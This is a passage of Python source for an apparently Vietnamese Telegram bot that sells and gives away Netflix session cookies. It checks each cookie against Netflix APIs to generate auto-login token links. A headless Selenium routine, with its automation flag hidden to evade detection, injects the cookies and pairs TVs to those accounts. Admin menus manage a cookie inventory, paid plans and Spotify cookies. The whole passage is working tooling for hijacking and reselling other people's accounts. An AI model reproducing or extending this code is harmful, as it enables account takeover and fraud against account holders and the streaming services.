                    info['video_quality'] = '480p (SD)'

            if info['max_streams'] == 'N/A' and info['plan'] != 'N/A':
                plan_lower = info['plan'].lower()
                if 'premium' in plan_lower:
                    info['max_streams'] = '4'
                elif 'standard' in plan_lower:
                    info['max_streams'] = '2'
                elif 'basic' in plan_lower or 'mobile' in plan_lower:
                    info['max_streams'] = '1'

            if info['extra_member'] == 'N/A' and info['plan'] != 'N/A':
                plan_lower = info['plan'].lower()
                if 'premium' in plan_lower or ('standard' in plan_lower and 'ads' not in plan_lower):
                    info['extra_member'] = 'Có'
                else:
                    info['extra_member'] = 'Không'

            if info['payment_on_hold'] == 'N/A':
                info['payment_on_hold'] = 'Không'

            if info['cc_type'] == 'N/A' and info['payment_method'] != 'N/A':
                pm = info['payment_method'].upper()
                cc_map = {
                    'CC': 'Credit Card', 'CREDIT_CARD': 'Credit Card',
                    'CREDITCARD': 'Credit Card', 'DCB': 'Nhà mạng (DCB)',
                    'PAYPAL': 'PayPal', 'GIFT': 'Gift Card',
                    'GIFTCARD': 'Gift Card', 'ITUNES': 'iTunes',
                    'GOOGLEPLAY': 'Google Play', 'AMEX': 'Amex',
                }
                info['cc_type'] = cc_map.get(pm, info['payment_method'])


        except Exception as e:
            logger.error(f"get_account_info error: {e}")

        return info

    def check_cookie(self, cookie_dict: Dict[str, str]) -> Tuple[bool, Optional[str], Optional[str], Dict[str, str]]:
        if 'NetflixId' not in cookie_dict:
            return False, None, "Thieu NetflixId", {}

        cookie_str = self.build_cookie_string(cookie_dict)
        last_error = "Loi khong xac dinh"

        endpoint_order = list(range(len(API_ENDPOINTS)))
        if self.last_working_endpoint > 0:
            endpoint_order.remove(self.last_working_endpoint)
            endpoint_order.insert(0, self.last_working_endpoint)

        query_order = list(range(len(QUERY_CONFIGS)))
        if self.last_working_query > 0:
            query_order.remove(self.last_working_query)
            query_order.insert(0, self.last_working_query)

        for ei in endpoint_order:
            api_url = API_ENDPOINTS[ei]
            for qi in query_order:
                payload = QUERY_CONFIGS[qi]
                try:
                    attempt_headers = self._get_headers(cookie_str)
                    response = self.session.post(
                        api_url, headers=attempt_headers, json=payload, timeout=REQUEST_TIMEOUT
                    )
                    if response.status_code == 200:
                        data = response.json()
                        token = None
                        if data and isinstance(data, dict) and isinstance(data.get('data'), dict):
                            token = data['data'].get('createAutoLoginToken')
                        if isinstance(token, str) and token.strip():
                            self.last_working_endpoint = ei
                            self.last_working_query = qi
                            account_info = self.get_account_info(cookie_dict)
                            return True, token, None, account_info
                        elif 'errors' in data:
                            errors = data.get('errors', [])
                            if errors:
                                err_type = errors[0].get('extensions', {}).get('errorType', '')
                                if err_type == 'PERMISSION_DENIED':
                                    last_error = "Cookie het han hoac khong hop le"
                                    break
                                else:
                                    last_error = f"{err_type}"
                        else:
                            last_error = "Phan hoi API khong hop le"
                    elif response.status_code == 401:
                        last_error = "Cookie het han (401)"
                        break
                    elif response.status_code == 403:
                        last_error = "Bi chan truy cap (403)"
                    else:
                        last_error = f"HTTP {response.status_code}"
                except requests.exceptions.Timeout:
                    last_error = "Het thoi gian cho"
                except requests.exceptions.ConnectionError:
                    last_error = "Loi ket noi"
                except Exception as e:
                    last_error = str(e)[:50]
                time.sleep(0.3)

            if "het han" in last_error.lower() or "PERMISSION" in last_error:
                break

        return False, None, last_error, {}

    def format_nftoken_link(self, token: str) -> str:
        return f"https://netflix.com/?nftoken={quote(str(token), safe='')}"


class ProxyManager:
    def __init__(self):
        self.proxy = None
        self.proxy_enabled = False
        self.proxy_string = None

    def set_proxy(self, proxy_string: str) -> bool:
        try:
            parts = proxy_string.strip().split(':')
            if len(parts) == 2:
                ip, port = parts
                self.proxy = {'http': f'http://{ip}:{port}', 'https': f'http://{ip}:{port}'}
                self.proxy_string = proxy_string
                return True
            elif len(parts) == 4:
                ip, port, user, password = parts
                proxy_url = f'http://{user}:{password}@{ip}:{port}'
                self.proxy = {'http': proxy_url, 'https': proxy_url}
                self.proxy_string = proxy_string
                return True
            return False
        except: return False
    def enable(self): self.proxy_enabled = True
    def disable(self): self.proxy_enabled = False
    def get_proxy(self): return self.proxy if self.proxy_enabled else None
    def get_status_icon(self) -> str: return "⚫" if not self.proxy else ("🟢" if self.proxy_enabled else "🔴")
    def get_status_text(self) -> str: return "Chưa thiết lập" if not self.proxy else (f"Tắt · `{self.proxy_string}`" if not self.proxy_enabled else f"Đang bật · `{self.proxy_string}`")

proxy_manager = ProxyManager()

checker = NetflixTokenChecker()


def repair_mojibake(value):
    """Repair common UTF-8-as-Latin-1 text without changing normal Unicode names."""
    if not isinstance(value, str):
        return value
    text = value
    for _ in range(2):
        if not any(marker in text for marker in ("Ã", "Â", "Ä", "Å", "Æ", "â€", "ðŸ", "á»")):
            break
        repaired = None
        for encoding in ("latin-1", "cp1252"):
            try:
                repaired = text.encode(encoding).decode("utf-8")
                break
            except (UnicodeEncodeError, UnicodeDecodeError):
                continue
        if repaired is None:
            break
        if repaired == text:
            break
        text = repaired
    return text


def escape_telegram_markdown(value):
    return str(value).replace("\\", "\\\\").replace("_", "\\_").replace("*", "\\*").replace("[", "\\[")

def process_tv_login(cookie_dict: dict, tv_code: str) -> Tuple[bool, str, str, dict]:
    import os
    import tempfile
    import shutil
    from urllib.parse import urlsplit
    try:
        from selenium import webdriver
        from selenium.webdriver.common.by import By
        from selenium.webdriver.chrome.options import Options as ChromeOptions
        from selenium.webdriver.chrome.service import Service as ChromeService
        from selenium.webdriver.edge.options import Options as EdgeOptions
        from selenium.webdriver.edge.service import Service as EdgeService
        from selenium.common.exceptions import TimeoutException, WebDriverException
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
        from selenium.webdriver.common.keys import Keys
    except ImportError:
        return False, "dependency_missing", "Máy chủ chưa cài thư viện. Chạy lệnh: pip install selenium", {}

    normalized_code = re.sub(r"[\s-]+", "", str(tv_code or "")).strip()
    if not (len(normalized_code) == 8 and normalized_code.isdigit()):
        return False, "invalid_code", "Mã TV phải gồm đúng 8 chữ số", {}

    driver = None
    temp_dir = tempfile.mkdtemp()
    attempt_id = f"tv-{int(time.time() * 1000) % 100000000:08d}"

    def current_path():
        if not driver:
            return ""
        try:
            return urlsplit(driver.current_url).path.lower()
        except Exception:
            return ""

    def is_login_path(path):
        normalized = (path or "").rstrip("/")
        return normalized == "/login" or normalized.startswith("/login/")

    def is_success_path(path):
        normalized = (path or "").lower()
        return any(
            marker in normalized
            for marker in (
                "/loginlinksuccess",
                "/tv8/success",
            )
        )

    def log_stage(stage, level=logging.INFO):
        # Never log the TV code, cookies, query string, page body or account data.
        logger.log(level, "TV login attempt=%s stage=%s path=%s", attempt_id, stage, current_path() or "-")

    def first_interactable(selectors):
        for selector in selectors:
            try:
                for element in driver.find_elements(By.CSS_SELECTOR, selector):
                    if element.is_displayed() and element.is_enabled():
                        return element
            except WebDriverException:
                continue
        return False

    def first_visible(selectors):
        for selector in selectors:
            try:
                for element in driver.find_elements(By.CSS_SELECTOR, selector):
                    if element.is_displayed():
                        return element
            except WebDriverException:
                continue
        return False

    def enabled_form_button(form_element):
        if form_element is None:
            return False
        try:
            return next(
                (
                    button for button in form_element.find_elements(By.CSS_SELECTOR, "button")
                    if button.is_displayed() and button.is_enabled()
                ),
                False,
            )
        except WebDriverException:
            return False

    input_selectors = (
        "input[name='rendezvousCode']",  # Current Netflix TV page.
        "input[data-uia='rendezvous-code-input']",
        "input[name='code']",
        "input[name='tvCode']",
        "input[inputmode='numeric']",
        "input[type='tel']",
    )
    submit_selectors = (
        "button[data-uia='continue-button']",  # Current Netflix TV page.
        "button[data-uia='tv8-submit-button']",
        "button.btn-red",
    )

    try:
        browser_name = "chrome"
        if os.name == "nt":
            edge_candidates = [
                os.path.join(os.environ.get("PROGRAMFILES(X86)", r"C:\Program Files (x86)"), "Microsoft", "Edge", "Application", "msedge.exe"),
                os.path.join(os.environ.get("PROGRAMFILES", r"C:\Program Files"), "Microsoft", "Edge", "Application", "msedge.exe"),
            ]
            browser_path = next((path for path in edge_candidates if os.path.exists(path)), None)
            if not browser_path:
                chrome_candidates = [
                    os.path.join(os.environ.get("PROGRAMFILES", r"C:\Program Files"), "Google", "Chrome", "Application", "chrome.exe"),
                    os.path.join(os.environ.get("PROGRAMFILES(X86)", r"C:\Program Files (x86)"), "Google", "Chrome", "Application", "chrome.exe"),
                ]
                browser_path = next((path for path in chrome_candidates if os.path.exists(path)), None)
            if not browser_path:
                return False, "browser_missing", "Windows chưa cài Microsoft Edge hoặc Google Chrome", {}
            if "\\Microsoft\\Edge\\" in browser_path:
                browser_name = "edge"
                options = EdgeOptions()
            else:
                options = ChromeOptions()
            options.binary_location = browser_path
        else:
            options = ChromeOptions()
        options.add_argument('--headless=new')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--window-size=1280,720')
        options.add_argument(f'--user-data-dir={temp_dir}')
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)

        bin_path = "/data/data/com.termux/files/usr/bin/chromium-browser"
        if not os.path.exists(bin_path):
            bin_path = "/data/data/com.termux/files/usr/bin/chromium"

        driver_path = "/data/data/com.termux/files/usr/bin/chromedriver"

        if os.name != "nt" and (not os.path.exists(driver_path) or not os.path.exists(bin_path)):
            return False, "browser_missing", "Không tìm thấy Chromium. Hãy chạy lệnh: pkg install chromium -y", {}

        if os.name != "nt":
            options.binary_location = bin_path
            service = ChromeService(executable_path=driver_path, log_path=os.path.devnull)
            driver = webdriver.Chrome(service=service, options=options)
        elif browser_name == "edge":
            edge_driver = os.path.join(
                os.path.dirname(os.path.abspath(__file__)),
                "tools",
                "msedgedriver.exe",
            )
            if not os.path.exists(edge_driver):
                return False, "webdriver_missing", "Windows chưa cài EdgeDriver tương ứng với Microsoft Edge", {}
            service = EdgeService(executable_path=edge_driver, log_output=os.path.devnull)
            driver = webdriver.Edge(service=service, options=options)
        else:
            # Selenium Manager resolves the matching ChromeDriver on Windows.
            driver = webdriver.Chrome(options=options)

        driver.set_page_load_timeout(45)
        try:
            driver.execute_cdp_cmd(
                "Page.addScriptToEvaluateOnNewDocument",
                {"source": "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})"},
            )
        except Exception:
            pass
        log_stage("browser_started")

        driver.get("https://www.netflix.com/")
        WebDriverWait(driver, 20).until(
            lambda active_driver: active_driver.execute_script("return document.readyState") in ("interactive", "complete")
        )
        accepted_cookies = 0
        for key, value in cookie_dict.items():
            if not key or value is None:
                continue
            payload = {'name': str(key), 'value': str(value), 'domain': '.netflix.com', 'path': '/'}
            try:
                driver.add_cookie(payload)
                accepted_cookies += 1
            except WebDriverException:
                try:
                    payload['domain'] = 'www.netflix.com'
                    driver.add_cookie(payload)
                    accepted_cookies += 1
                except WebDriverException:
                    continue

        if accepted_cookies == 0 or not ({"NetflixId", "SecureNetflixId"} & set(cookie_dict)):
            log_stage("cookie_rejected", logging.WARNING)
            return False, "cookie_format", "Cookie sai định dạng hoặc thiếu phiên Netflix", {}

        # The TV code page is public, so validate the authenticated session first.
        driver.get("https://www.netflix.com/YourAccount")
        WebDriverWait(driver, 20).until(
            lambda active_driver: active_driver.execute_script("return document.readyState") in ("interactive", "complete")
        )
        account_path = current_path()
        login_controls = driver.find_elements(By.CSS_SELECTOR, "input[name='password'], input[type='password']")
        if is_login_path(account_path) or login_controls:
            log_stage("cookie_expired", logging.WARNING)
            return False, "cookie_expired", "Cookie đã chết hoặc hết hạn", {}
        log_stage("cookie_validated")

        driver.get("https://www.netflix.com/tv8")
        wait = WebDriverWait(driver, 25, poll_frequency=0.4)
        try:
            code_input = wait.until(lambda _active_driver: first_interactable(input_selectors))
        except TimeoutException:
            if is_login_path(current_path()):
                log_stage("cookie_expired_on_tv", logging.WARNING)
                return False, "cookie_expired", "Cookie đã chết hoặc hết hạn", {}
            log_stage("code_input_missing", logging.WARNING)
            return False, "selector_changed", f"Netflix chưa hiển thị ô nhập mã (mã lỗi {attempt_id})", {}

        code_input.click()
        code_input.send_keys(Keys.CONTROL, "a")
        code_input.send_keys(Keys.BACKSPACE)
        for character in normalized_code:
            code_input.send_keys(character)
            time.sleep(0.08)

        entered_value = re.sub(r"[\s-]+", "", str(code_input.get_attribute("value") or ""))
        if entered_value != normalized_code:
            # Fallback for a React-controlled field only when normal keystrokes did
            # not update the actual DOM value.
            driver.execute_script(
                """
                const input = arguments[0];
                const value = arguments[1];
                const setter = Object.getOwnPropertyDescriptor(
                    window.HTMLInputElement.prototype, 'value'
                ).set;
                setter.call(input, value);
                input.dispatchEvent(new InputEvent('input', {
                    bubbles: true, inputType: 'insertText', data: value.slice(-1)
                }));
                input.dispatchEvent(new Event('change', {bubbles: true}));
                """,
                code_input,
                normalized_code,
            )

        form_element = None
        try:
            form_element = code_input.find_element(By.XPATH, "./ancestor::form[1]")
        except WebDriverException:
            pass

        submit_btn = first_visible(submit_selectors)
        if not submit_btn and form_element is not None:
            try:
                submit_btn = next(
                    (button for button in form_element.find_elements(By.CSS_SELECTOR, "button") if button.is_displayed()),
                    False,
                )
            except WebDriverException:
                submit_btn = False

        if submit_btn and not submit_btn.is_enabled():
            try:
                submit_btn = WebDriverWait(driver, 10, poll_frequency=0.25).until(
                    lambda _active_driver: first_interactable(submit_selectors)
                    or enabled_form_button(form_element)
                )
            except TimeoutException:
                pass

        submitted = False
        if submit_btn and submit_btn.is_enabled():
            driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", submit_btn)
            try:
                # WebDriver click behaves like a real user interaction. Netflix may
                # ignore an untrusted JavaScript click.
                submit_btn.click()
            except WebDriverException:
                driver.execute_script("arguments[0].click();", submit_btn)
            submitted = True
        if not submitted:
            try:
                code_input.send_keys(Keys.ENTER)
                submitted = True
            except WebDriverException:
                pass
        if not submitted and form_element is not None:
            try:
                driver.execute_script("arguments[0].requestSubmit();", form_element)
                submitted = True
            except WebDriverException:
                pass
        if not submitted:
            log_stage("submit_unavailable", logging.WARNING)
            return False, "submit_failed", f"Netflix không nhận thao tác gửi mã (mã lỗi {attempt_id})", {}
        log_stage("code_submitted")

        error_markers = (
            "mã không hợp lệ", "mã không đúng", "mã đã hết hạn",
            "invalid code", "incorrect code", "code has expired", "code is invalid",
            "unable to link", "unable to connect", "we were unable", "there was a problem",
            "nieprawidłowy kod", "kod jest nieprawidłowy", "kod wygasł",
            "nie udało się", "wystąpił problem",
        )
        expired_markers = ("mã đã hết hạn", "code has expired", "kod wygasł", "expired")
        invalid_markers = ("mã không hợp lệ", "mã không đúng", "invalid code", "incorrect code", "nieprawidłowy kod", "kod jest nieprawidłowy")
        success_markers = (
            "thiết bị của bạn đã được kết nối", "tv đã được kết nối", "đã kết nối thành công",
            "your tv is now connected", "your device is connected",
            "successfully connected",
            "telewizor został połączony", "urządzenie zostało połączone",
        )

        def result_state(active_driver):
            path = current_path()
            # `/loginlinksuccess` is Netflix's current successful TV pairing URL;
            # test success before matching the standalone `/login` route.
            if is_success_path(path):
                return "success"
            if is_login_path(path):
                return "cookie"
            try:
                body = active_driver.find_element(By.TAG_NAME, "body").text.lower()
            except WebDriverException:
                body = ""
            try:
                code_fields = active_driver.find_elements(By.CSS_SELECTOR, ",".join(input_selectors))
                if any(str(field.get_attribute("aria-invalid")).lower() == "true" for field in code_fields):
                    return "netflix_error"
                error_elements = active_driver.find_elements(
                    By.CSS_SELECTOR,
                    "[role='alert'], [aria-live='assertive'], [data-uia*='error'], [class*='error']",
                )
                if any(element.is_displayed() and element.text.strip() for element in error_elements):
                    return "netflix_error"
            except WebDriverException:
                pass
            if any(marker in body for marker in expired_markers):
                return "expired"
            if any(marker in body for marker in invalid_markers):
                return "invalid"
            if any(marker in body for marker in error_markers):
                return "netflix_error"
            if any(marker in body for marker in success_markers):
                return "success"
            return False

        try:
            state = WebDriverWait(driver, 35, poll_frequency=0.5).until(result_state)
        except TimeoutException:
            path = current_path()
            if path in ("/browse", "/profiles") or any(
                marker in path for marker in ("switchprofile", "profilesgate")
            ):
                log_stage("unconfirmed_account_redirect", logging.WARNING)
                return False, "netflix_unconfirmed", f"Netflix chuyển sang phiên tài khoản nhưng chưa xác nhận ghép TV (mã lỗi {attempt_id})", {}
            log_stage("confirmation_timeout", logging.WARNING)
            return False, "netflix_confirmation_timeout", f"Netflix không trả về trạng thái xác nhận (mã lỗi {attempt_id})", {}

        if state == "cookie":
            log_stage("cookie_expired_after_submit", logging.WARNING)
            return False, "cookie_expired", "Cookie đã chết hoặc hết hạn", {}
        if state == "expired":
            log_stage("code_expired", logging.WARNING)
            return False, "tv_code_expired", "Netflix xác nhận mã TV đã hết hạn", {}
        if state == "invalid":
            log_stage("code_invalid", logging.WARNING)
            return False, "tv_code_invalid", "Netflix xác nhận mã TV không hợp lệ", {}
        if state == "netflix_error":
            log_stage("netflix_error", logging.WARNING)
            return False, "netflix_error", "Netflix trả về lỗi khi kết nối mã TV", {}
        if state == "success":
            log_stage("connected", logging.WARNING)
            current_cookies = {ck['name']: ck['value'] for ck in driver.get_cookies()}
            account_info = checker.get_account_info(current_cookies)
            return True, "connected", "Thành công", account_info

        log_stage("unknown_result", logging.WARNING)
        return False, "netflix_unknown", f"Netflix trả về trạng thái chưa xác định (mã lỗi {attempt_id})", {}
    except TimeoutException:
        log_stage("page_timeout", logging.WARNING)
        return False, "network_timeout", f"Netflix phản hồi quá chậm (mã lỗi {attempt_id})", {}
    except WebDriverException as error:
        # Log only the exception type; Selenium messages can contain request URLs.
        logger.error("TV login attempt=%s stage=webdriver_error type=%s", attempt_id, type(error).__name__)
        return False, "webdriver_error", f"Trình duyệt/EdgeDriver gặp lỗi (mã lỗi {attempt_id})", {}
    except Exception as error:
        # Log only the exception type; Selenium messages can contain request URLs.
        logger.error("TV login attempt=%s stage=system_error type=%s", attempt_id, type(error).__name__)
        return False, "browser_error", f"Không thể mở phiên Netflix (mã lỗi {attempt_id})", {}
    finally:
        if driver:
            try:
                driver.quit()
            except Exception:
                pass
        try:
            shutil.rmtree(temp_dir, ignore_errors=True)
        except Exception:
            pass

def kb_main():
    rows = []
    if MINIAPP_URL.startswith('https://'):
        rows.append([InlineKeyboardButton("🚀 MỞ NFToken MINI APP", web_app=WebAppInfo(MINIAPP_URL))])
    rows.extend([
        [InlineKeyboardButton("🛒 Cửa Hàng", callback_data='store_main'), InlineKeyboardButton("💸 Nạp Tiền", callback_data='deposit_main')],
        [InlineKeyboardButton("Lấy Cookie (Đã Mua)", callback_data='extract_vip'), InlineKeyboardButton("Tạo Link (Theo Gói)", callback_data='menu_chk')],
        [InlineKeyboardButton("📺 Đăng nhập TV (FREE)", callback_data='menu_tv_log'), InlineKeyboardButton("🎁 Điểm Danh", callback_data='menu_freecookie')],
        [InlineKeyboardButton("📜 Lịch Sử Gói", callback_data='purchase_history'), InlineKeyboardButton("📚 Hướng Dẫn", callback_data='menu_help')]
    ])
    return InlineKeyboardMarkup(rows)

async def cmd_app(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Public entry point: every user can open the Mini App without an admin check."""
    if not await check_user_status(update, context): return
    if not MINIAPP_URL.startswith('https://'):
        await update.effective_message.reply_text(
            "⚠️ Mini App chưa được bật công khai. Admin cần cấu hình TELEGRAM_MINIAPP_URL bằng URL HTTPS."
        )
        return
    await update.effective_message.reply_text(
        "🚀 Bấm nút bên dưới để mở NFToken Pro Mini App.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🚀 MỞ MINI APP", web_app=WebAppInfo(MINIAPP_URL))]
        ]),
    )

async def configure_miniapp_menu(application):
    """Expose the app from Telegram's public bot menu for all chats."""
    if not MINIAPP_URL.startswith('https://'):
        logger.warning("TELEGRAM_MINIAPP_URL chưa phải HTTPS; bỏ qua menu Mini App")
        return
    try:
        await application.bot.set_chat_menu_button(
            menu_button=MenuButtonWebApp(
                text="Mở Mini App",
                web_app=WebAppInfo(MINIAPP_URL),
            )
        )
        logger.info("Đã bật nút công khai Mở Mini App: %s", MINIAPP_URL)
    except Exception:
        logger.exception("Không thể cấu hình menu Mini App công khai")

async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_user_status(update, context): return
    try:
        payload = json.loads(update.effective_message.web_app_data.data)
    except (AttributeError, TypeError, json.JSONDecodeError):
        await update.effective_message.reply_text("❌ Yêu cầu Mini App không hợp lệ.")
        return
    allowed = {
        'menu_tv_log': '📺 Mở đăng nhập Netflix TV',
        'menu_chk': '⚡ Mở tạo NFToken',
        'menu_freecookie': '🎁 Mở nhận Cookie miễn phí',
        'deposit_main': '💸 Mở nạp tiền',
        'report_error': '🛟 Mở hỗ trợ trực tiếp',
    }
    action = payload.get('action') if payload.get('type') == 'open_bot_action' else None
    if action not in allowed:
        await update.effective_message.reply_text("❌ Chức năng Mini App không được hỗ trợ.")
        return
    await update.effective_message.reply_text(
        "Mini App đã chuyển bạn về đúng chức năng của bot:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(allowed[action], callback_data=action)]])
    )

def kb_back(): return InlineKeyboardMarkup([[InlineKeyboardButton("🏡 Về Trang Chủ", callback_data='back_main')]])
def kb_cancel(): return InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Dừng Tiến Trình", callback_data='cancel_task')]])
def kb_done(): return InlineKeyboardMarkup([[InlineKeyboardButton("🔁 Tạo Tiếp", callback_data='menu_chk'), InlineKeyboardButton("🏡 Trang Chủ", callback_data='back_main')]])
def kb_done_with_report(): return InlineKeyboardMarkup([[InlineKeyboardButton("⚠️ Báo Lỗi", callback_data='report_error')], [InlineKeyboardButton("🔁 Thực hiện tiếp", callback_data='menu_chk'), InlineKeyboardButton("🏡 Trang Chủ", callback_data='back_main')]])
def kb_proxy(): return InlineKeyboardMarkup([[InlineKeyboardButton("✏️ Đổi Proxy", callback_data='proxy_set'), InlineKeyboardButton("🔄 Tắt / Bật", callback_data='proxy_toggle')], [InlineKeyboardButton("🏡 Về Trang Chủ", callback_data='back_main')]])

def kb_admin():
    global MAINTENANCE_MODE
    mtn_text = "🛠 Tắt Bảo Trì" if MAINTENANCE_MODE else "🛠 Bật Bảo Trì"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🍪 Thêm Cookie Mới", callback_data='admin_choose_add_type'), InlineKeyboardButton("📦 Kho Cookie", callback_data='admin_cookie_inventory')],
        [InlineKeyboardButton("🎧 Lấy Cookie Spotify", callback_data='admin_get_spotify')],
        [InlineKeyboardButton(mtn_text, callback_data='admin_toggle_mtn'), InlineKeyboardButton("📢 Gửi Thông Báo", callback_data='admin_broadcast')],
        [InlineKeyboardButton("🎟 Tạo Mã Khuyến Mãi", callback_data='admin_add_discount'), InlineKeyboardButton("✏️ Đổi Gói", callback_data='admin_setplan')],
        [InlineKeyboardButton("🔒 Khóa User", callback_data='admin_ban_user'), InlineKeyboardButton("🔓 Mở Khóa User", callback_data='admin_unban_user')],
        [InlineKeyboardButton("👥 DS Người Dùng", callback_data='admin_list_users'), InlineKeyboardButton("🚫 DS Bị Khóa", callback_data='admin_list_banned')],
        [InlineKeyboardButton("➕ Tạo Gói", callback_data='admin_addplan'), InlineKeyboardButton("🛒 Thêm Gói CH", callback_data='admin_addstore')],
        [InlineKeyboardButton("🗑 Xóa Gói CH", callback_data='admin_delstore'), InlineKeyboardButton("🔍 Tra cứu HĐ", callback_data='admin_lookup_bill')],
        [InlineKeyboardButton("🏡 Đóng", callback_data='back_main')]
    ])

async def cmd_baoloi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_user_status(update, context): return
    try: await update.message.delete()
    except: pass
    text = (
        f"⚠️ *BÁO LỖI / LIÊN HỆ ADMIN*\n\n"
        f"Vui lòng nhắn tin mô tả chi tiết lỗi bạn gặp phải hoặc gửi kèm hình ảnh chụp màn hình vào đây.\n"
        f"Hệ thống sẽ chuyển báo cáo của bạn đến Admin, hoặc bạn có thể nhắn thẳng cho Telegram: `@mnhutdznecon`."
    )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=text, parse_mode='Markdown', reply_markup=kb_back())
    context.user_data['awaiting'] = 'report_error'

async def cmd_giftcode(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_user_status(update, context): return
    try: await update.message.delete()
    except: pass
    user_id = update.effective_user.id
    if not context.args:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="🎟 Vui lòng nhập mã. Ví dụ: `/giftcode SALE50K`", parse_mode='Markdown')
        return
    code = context.args[0]
    success, msg = use_discount_code(code, user_id)
    if success: await context.bot.send_message(chat_id=update.effective_chat.id, text=f"🎉 Chúc mừng! Bạn đã nhận được *{msg:,.0f}đ* vào số dư.", parse_mode='Markdown')
    else: await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ {msg}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_user_status(update, context): return
    try: await update.message.delete()
    except: pass
    user = update.effective_user
    name = user.first_name.replace("_", "").replace("*", "").replace("`", "").replace("[", "") if user and user.first_name else "bạn"
    get_user(user.id, user.username)
    balance, credits = get_user_economy(user.id)
    await context.bot.send_message(chat_id=update.effective_chat.id, text=banner_main(user.id, name, balance, credits), parse_mode='Markdown', reply_markup=kb_main())

async def cmd_me(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_user_status(update, context): return
    try: await update.message.delete()
    except: pass
    user = update.effective_user
    tokens_used, tokens_max, cookies_used, cookies_max, plan_name = get_user_quota(user.id)
    text = (
        f"👤 *Thông tin Tài Khoản*\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🔹 **ID:** `{user.id}`\n"
        f"🔹 **Gói cước:** `{plan_name}`\n\n"
        f"🔋 **Giới hạn hôm nay:**\n"
        f"  • Tạo link: {tokens_used}/{tokens_max if tokens_max < 99999 else 'Vô hạn'}\n"
        f"  • Cookie Free: {cookies_used}/{cookies_max if cookies_max < 99999 else 'Vô hạn'}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=text, parse_mode='Markdown')

async def cmd_freecookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_user_status(update, context): return
    try: await update.message.delete()
    except: pass
    user = update.effective_user
    tokens_used, tokens_max, cookies_used, cookies_max, plan_name = get_user_quota(user.id)
    if cookies_used >= cookies_max:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Bạn đã hết lượt nhận Cookie Free hôm nay. Hãy nâng cấp gói cước để nhận thêm nhé.")
        return
    cookie_data = claim_free_cookie(user.id)
    if not cookie_data:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"😔 Rất tiếc, kho Cookie Free hiện tại đang trống. Vui lòng quay lại sau!")
        return
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"🎁 *COOKIE FREE CỦA BẠN*\n━━━━━━━━━━━━━━━━━━\n`{cookie_data}`\n━━━━━━━━━━━━━━━━━━\n💡 Lượt nhận còn lại hôm nay: {cookies_max - cookies_used - 1}", parse_mode='Markdown')

async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_user_status(update, context): return
    try: await update.message.delete()
    except: pass
    user = update.effective_user
    if user.id != ADMIN_ID: return
    total, active, tokens, avail, used = get_stats()
    text = (
        f"👑 *ADMIN DASHBOARD*\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👥 Tổng User: {total}\n"
        f"🟢 Active hôm nay: {active}\n"
        f"🔗 Tổng Link tạo: {tokens}\n"
        f"🎁 Kho Cookie: {avail} (đã phát: {used})\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👉 Chọn tính năng quản lý bên dưới:"
    )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=text, parse_mode='Markdown', reply_markup=kb_admin())

async def cmd_setplan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try: await update.message.delete()
    except: pass
    args = context.args
    if len(args) < 2:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Lỗi: `/setplan <user_id> <plan_name>`", parse_mode='Markdown')
        return
    if set_plan(args[0], args[1].upper()): await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Đã set user `{args[0]}` lên gói `{args[1].upper()}`", parse_mode='Markdown')
    else: await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Gói cước không tồn tại!")

async def cmd_addplan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try: await update.message.delete()
    except: pass
    args = context.args
    if len(args) < 3:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Lỗi: `/addplan <tên> <link/ngày> <cookie/ngày>`", parse_mode='Markdown')
        return
    add_plan(args[0].upper(), int(args[1]), int(args[2]))
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Đã thêm/cập nhật cấu hình gói `{args[0].upper()}`\n\n💡 _Lưu ý: Để hiển thị gói này trong Cửa hàng, hãy dùng lệnh /addstore_", parse_mode='Markdown')

async def cmd_addcookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try: await update.message.delete()
    except: pass
    cookie = " ".join(context.args)
    if not cookie:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Lỗi: `/addcookie <chuỗi cookie>`", parse_mode='Markdown')
        return
    add_free_cookie(cookie)
    await context.bot.send_message(chat_id=update.effective_chat.id, text="✅ Đã thêm vào kho Cookie Free!")

async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try: await update.message.delete()
